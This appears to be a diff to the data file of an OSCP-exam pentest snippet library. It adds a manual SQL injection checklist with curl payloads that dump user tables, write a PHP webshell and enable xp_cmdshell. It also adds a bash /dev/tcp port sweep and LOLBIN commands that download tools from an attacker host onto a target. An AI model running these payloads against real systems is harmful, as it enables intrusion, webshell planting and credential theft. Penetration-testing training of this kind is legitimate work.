@@ -339,8 +339,120 @@ mv report.pdf OSCP-OS-XXXXX-Exam-Report.pdf
 # Archive, no password, under 200MB:
 7z a OSCP-OS-XXXXX-Exam-Report.7z OSCP-OS-XXXXX-Exam-Report.pdf
 # Verify locally, compare with what upload.offsec.com shows:
-md5sum OSCP-OS-XXXXX-Exam-Report.7z` }
+md5sum OSCP-OS-XXXXX-Exam-Report.7z` },
+
+// ============ WEB — EXAM-SAFE (LOTL substitutes) ============
+{ id:'manual-sqli', cat:'Web — exam-safe (sqlmap substitute)', name:'Manual SQL injection checklist (LOTL — no sqlmap)', lang:'bash',
+  desc:'Hand-driven SQLi: detect, then confirm via UNION / error / boolean / time, extract, and escalate to RCE — the OSCP-safe path when automated exploitation is off-limits.',
+  when:'A parameter reflects into a SQL query and exam rules forbid sqlmap (automated exploitation). Work each stage by hand with curl or the browser so every request is deliberate and documented.',
+  where:'Run from KALI against the web target (or through your proxy). Nothing runs on the target until the RCE stage, which you trigger manually.',
+  how:'Go top to bottom. Confirm the injection class first (a single quote that breaks the page = candidate). Pick ONE technique that works, extract, then only attempt RCE where the DB engine and privileges allow it. Capture the request and response for every finding.',
+  code:
+`# 0) Detect — does a quote break it, and does the logic respond?
+curl -s "http://{{target}}/page.php?id=1'"                 # error / 500 / changed page = candidate
+curl -s "http://{{target}}/page.php?id=1 AND 1=1 -- -"      # true  -> normal page
+curl -s "http://{{target}}/page.php?id=1 AND 1=2 -- -"      # false -> different/empty page
+
+# 1) Column count (increment until it stops erroring):
+curl -s "http://{{target}}/page.php?id=1 ORDER BY 1 -- -"
+# ...ORDER BY 2, 3, ... last working number = column count
+
+# 2) UNION — find which columns echo (N = column count):
+curl -s "http://{{target}}/page.php?id=-1 UNION SELECT 1,2,3 -- -"
+curl -s "http://{{target}}/page.php?id=-1 UNION SELECT 1,@@version,3 -- -"
+curl -s "http://{{target}}/page.php?id=-1 UNION SELECT 1,current_user(),database() -- -"
+
+# 3) Enumerate schema via information_schema:
+curl -s "http://{{target}}/page.php?id=-1 UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database() -- -"
+curl -s "http://{{target}}/page.php?id=-1 UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users' -- -"
+curl -s "http://{{target}}/page.php?id=-1 UNION SELECT 1,group_concat(username,0x3a,password),3 FROM users -- -"
+
+# 4) Error-based (UNION blocked, MySQL):
+curl -s "http://{{target}}/page.php?id=1 AND extractvalue(1,concat(0x7e,(SELECT database()))) -- -"
+
+# 5) Blind boolean (nothing echoed) — compare true vs false page char by char:
+curl -s "http://{{target}}/page.php?id=1 AND substring((SELECT database()),1,1)='a' -- -"
+
+# 6) Blind time-based (no boolean tell):
+curl -s "http://{{target}}/page.php?id=1 AND IF(substring((SELECT database()),1,1)='a',sleep(3),0) -- -"                 # MySQL
+curl -s "http://{{target}}/page.php?id=1; IF (ASCII(SUBSTRING((SELECT DB_NAME()),1,1))=97) WAITFOR DELAY '0:0:3' -- -"  # MSSQL
+
+# 7) Manual RCE (only where DB + privileges allow — the --os-shell equivalent):
+# MySQL FILE priv -> write a webshell into the webroot:
+curl -s "http://{{target}}/page.php?id=-1 UNION SELECT 1,'<?php system($_GET[0]);?>',3 INTO OUTFILE '/var/www/html/s.php' -- -"
+curl -s "http://{{target}}/s.php?0=id"
+# MSSQL sysadmin -> enable + use xp_cmdshell (stacked query):
+curl -s "http://{{target}}/page.php?id=1; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE; EXEC xp_cmdshell 'whoami' -- -"
+
+# Evidence to capture per stage: the exact request, the true/false response diff,
+# extracted data, and — for RCE — the command output in the response.`,
+  execMode:'kali', examSafe:true, substitutesFor:['sqlmap'],
+  examSafeReason:'Every request is issued by hand (curl/browser), so it performs no automated exploitation — the OSCP-permitted alternative to sqlmap.' },
+
+// ============ ENUMERATION — LOTL ============
+{ id:'portsweep-bash', cat:'Enumeration — exam-safe (nmap substitute)', name:'Bash /dev/tcp port + host sweep (no nmap on target)', lang:'bash',
+  desc:'Pure-bash TCP connect scan using the /dev/tcp builtin — probe internal hosts/ports from a Linux foothold with nothing to upload.',
+  when:'You landed on a Linux host with no nmap/nc and need to map what it can reach internally (pivot recon).',
+  where:'Run ON the target (bash). No files touch disk.',
+  how:'Adjust the host and port list. /dev/tcp is a bash builtin, so it works even where scanners are absent. For a subnet, loop the last octet as in the third line.',
+  code:
+`# Single host, common ports:
+host={{target}}; for p in 21 22 23 25 53 80 110 139 143 443 445 3306 3389 5985 8080; do (echo >/dev/tcp/$host/$p) >/dev/null 2>&1 && echo "$host:$p open"; done
+# Full range on one host (slow):
+host={{target}}; for p in $(seq 1 1024); do (echo >/dev/tcp/$host/$p) >/dev/null 2>&1 && echo "$p open"; done
+# Sweep a /24 for a live service (find internal hosts):
+for i in $(seq 1 254); do h=10.10.10.$i; (echo >/dev/tcp/$h/445) >/dev/null 2>&1 && echo "$h 445 open"; done`,
+  execMode:'target', examSafe:true, substitutesFor:['nmap'],
+  examSafeReason:'Uses only the bash /dev/tcp builtin — no scanner uploaded or installed, and no automated exploitation.' },
+
+// ============ TRANSFER — LOTL ============
+{ id:'transfer-lolbin', cat:'Shells — exam-safe file transfer', name:'LOLBIN file transfer (curl / wget / built-ins)', lang:'bash',
+  desc:'Move a tool onto the target using only what is already installed — curl, wget, bash /dev/tcp, PowerShell, or certutil — no dedicated transfer tool.',
+  when:'You have execution but must fetch a binary/script and want to avoid uploading a transfer tool that AV signatures know.',
+  where:'Serve from KALI (first line), pull on the TARGET (the rest). Pick the one whose interpreter exists.',
+  how:'Start the HTTP server on Kali, then run the matching client line on the target. certutil and PowerShell are the Windows LOLBIN fallbacks; curl/wget/bash-/dev/tcp cover Linux.',
+  code:
+`# Kali server (serve the current directory):
+python3 -m http.server 80
+# Linux target:
+curl -s http://{{lhost}}/tool -o /tmp/tool && chmod +x /tmp/tool
+wget -q http://{{lhost}}/tool -O /tmp/tool
+# Linux with neither curl nor wget (bash /dev/tcp):
+exec 3<>/dev/tcp/{{lhost}}/80; echo -e "GET /tool HTTP/1.0\\r\\n\\r\\n" >&3; cat <&3 > /tmp/tool
+# Windows target (PowerShell / LOLBIN):
+powershell -c "iwr http://{{lhost}}/tool.exe -OutFile C:\\Users\\Public\\t.exe"
+certutil -urlcache -split -f http://{{lhost}}/tool.exe C:\\Users\\Public\\t.exe`,
+  execMode:'target', examSafe:true, substitutesFor:[],
+  examSafeReason:'Relies only on binaries already present on the host (living off the land); no transfer tooling is uploaded.' }
 ];
+
+// ---- Exam-safe / LOTL metadata (v10.11 Build B) ----------------------------------------
+// Attach execMode (kali|target|pivot), examSafe (OSCP-rule-safe: no automated exploitation),
+// substitutesFor (tool ids this snippet stands in for), and a short examSafeReason to the
+// pre-existing scripts above. Scripts authored later carry these fields inline. The path and
+// library facet (Builds B/C) consume this metadata; no script is executed by attaching it.
+(function(list){
+  const META={
+    ldapsearch:{execMode:'target',examSafe:true,substitutesFor:['bloodhound-python','netexec'],examSafeReason:'Pure .NET DirectoryServices querying — no collector uploaded and no automated exploitation, so it stands in for BloodHound/NetExec collection under exam rules.'},
+    'ldap-cookbook':{execMode:'target',examSafe:true,substitutesFor:['bloodhound-python'],examSafeReason:'Hand-run LDAP queries answer the questions BloodHound would graph without running a collector.'},
+    'pv-cookbook':{execMode:'target',examSafe:true,substitutesFor:['bloodhound-python'],examSafeReason:'PowerView is manual AD enumeration (permitted), not automated exploitation; it replaces BloodHound edges query by query.'},
+    'ps-rev':{execMode:'target',examSafe:true,substitutesFor:[],examSafeReason:'A hand-built TCP reverse shell — no framework payload or automated handler.'},
+    cradles:{execMode:'target',examSafe:true,substitutesFor:[],examSafeReason:'Built-in download cradles and the certutil LOLBIN — nothing automated, nothing framework-generated.'},
+    tty:{execMode:'target',examSafe:true,substitutesFor:[],examSafeReason:'Interpreter built-ins only; a manual shell upgrade with no tooling.'},
+    'proof-snap':{execMode:'target',examSafe:true,substitutesFor:[],examSafeReason:'Native commands to capture the proof frame; nothing to install.'},
+    'ligolo-quick':{execMode:'pivot',examSafe:true,substitutesFor:[],examSafeReason:'Manual tunnelling the operator drives step by step — permitted pivoting, no automated exploitation.'},
+    'chisel-quick':{execMode:'pivot',examSafe:true,substitutesFor:[],examSafeReason:'Manual SOCKS/port-forward tunnelling the operator drives; permitted pivoting.'},
+    pscred:{execMode:'target',examSafe:true,substitutesFor:[],examSafeReason:'Native PowerShell credential object — no tooling, no automated exploitation.'},
+    b64:{execMode:'kali',examSafe:true,substitutesFor:[],examSafeReason:'Local encoding helper on Kali; touches no target.'},
+    'portscan-ps':{execMode:'target',examSafe:true,substitutesFor:['nmap'],examSafeReason:'Native Test-NetConnection sweep — no scanner uploaded to the target.'},
+    hashverify:{execMode:'target',examSafe:true,substitutesFor:[],examSafeReason:'Built-in hashing to verify a transfer; nothing installed.'},
+    'win-pe-quick':{execMode:'target',examSafe:true,substitutesFor:[],examSafeReason:'Native Windows commands for a manual privesc pass; no automated exploitation.'},
+    'lin-pe-quick':{execMode:'target',examSafe:true,substitutesFor:[],examSafeReason:'Native Linux commands for a manual privesc pass; no automated exploitation.'},
+    'peas-fetch':{execMode:'target',examSafe:true,substitutesFor:[],examSafeReason:'PEAS is an enumeration script the operator reads (permitted); it runs no exploits.'},
+    'oscp-submit':{execMode:'kali',examSafe:true,substitutesFor:[],examSafeReason:'Local report packaging on Kali; touches no target.'}
+  };
+  for(const s of list||[]){const m=META[s.id];if(m)for(const k in m)if(s[k]===undefined)s[k]=m[k];}
+})(window.OBOL_SCRIPTS);
 ;
 /* obol-runtime-fragment: data/scripts-v2.5.js */
 // Obol v2.5 script-builder profiles — contextual toggles and engagement-aware rendering.
